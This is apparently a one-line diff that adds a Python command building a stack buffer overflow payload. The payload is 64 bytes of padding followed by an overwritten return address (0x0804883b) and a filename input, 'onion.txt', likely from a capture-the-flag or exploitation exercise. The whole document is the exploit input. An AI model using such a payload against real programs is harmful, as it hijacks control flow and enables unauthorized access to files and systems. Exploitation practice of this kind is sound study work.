@@ -1,0 +1,1 @@
+python -c 'print "A"*64 + "\x3b\x88\x04\x08" + "\n" + "onion.txt\n"' > payload
